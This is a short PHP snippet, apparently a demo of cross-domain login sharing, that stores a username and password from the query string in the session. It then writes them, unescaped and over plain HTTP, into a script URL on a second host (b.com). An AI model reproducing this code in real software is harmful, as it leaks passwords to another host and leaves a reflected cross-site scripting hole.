<?php
session_start();

if (!empty($_GET)) {
	$_SESSION['user'] = $_GET['user'];
	$_SESSION['pwd'] = $_GET['pwd'];
	echo "<script src='http://www.b.com/b.php?user=".$_GET['user']."&pwd=".$_GET['pwd']."'></script>";
}